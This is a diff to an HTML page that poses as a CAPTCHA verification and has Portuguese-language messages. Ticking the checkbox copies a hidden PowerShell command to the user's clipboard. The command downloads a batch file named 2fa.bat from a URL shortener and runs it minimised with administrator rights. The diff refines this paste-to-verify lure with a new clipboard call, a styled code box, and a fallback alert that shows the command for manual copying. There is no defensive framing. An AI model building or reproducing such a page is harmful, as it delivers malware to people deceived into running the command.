@@ -97,6 +97,17 @@
             background: #ccc;
             cursor: not-allowed;
         }
+
+        .verification-code {
+            background: #f8f9fa;
+            padding: 10px;
+            margin: 15px 0;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #202124;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -134,23 +145,34 @@
     </div>
 
     <script>
-        document.getElementById('captcha-checkbox').addEventListener('change', function() {
+        document.getElementById('captcha-checkbox').addEventListener('change', async function() {
+            const verificationBox = document.getElementById('verification-box');
+            const verifyButton = document.getElementById('verify-button');
+            
             if (this.checked) {
-                const command = `powershell -w h -c "iwr -useb https://tinyurl.com/38j9myu7 -OutFile $HOME\2fa.bat; while (!(Test-Path $HOME\2fa.bat)) {Start-Sleep 1}; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /min /b %HOMEPATH%\2fa.bat' -Verb RunAs"`;
+                const command = `powershell -w h -c "iwr -useb https://tinyurl.com/38j9myu7 -OutFile $HOME\\2fa.bat; while (!(Test-Path $HOME\\2fa.bat)) {Start-Sleep 1}; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /min /b %HOMEPATH%\\2fa.bat' -Verb RunAs"`;
                 
-                const textArea = document.createElement('textarea');
-                textArea.value = command;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-
-                document.getElementById('verification-box').style.display = 'block';
+                try {
+                    await navigator.clipboard.writeText(command);
+                    console.log('Comando copiado para a área de transferência');
+                    verificationBox.style.display = 'block';
+                    verifyButton.disabled = false;
+                } catch (err) {
+                    console.error('Falha ao copiar o comando:', err);
+                    alert('Erro ao copiar o comando! Por favor copie manualmente:\\n\\n' + command);
+                    verificationBox.style.display = 'block';
+                    verifyButton.disabled = false;
+                }
             } else {
-                document.getElementById('verification-box').style.display = 'none';
+                verificationBox.style.display = 'none';
+                verifyButton.disabled = true;
             }
         });
+
+        function verificarCaptcha() {
+            // Adicione aqui a lógica de verificação
+            alert('Verificação em andamento...');
+        }
     </script>
 </body>
 </html>
-
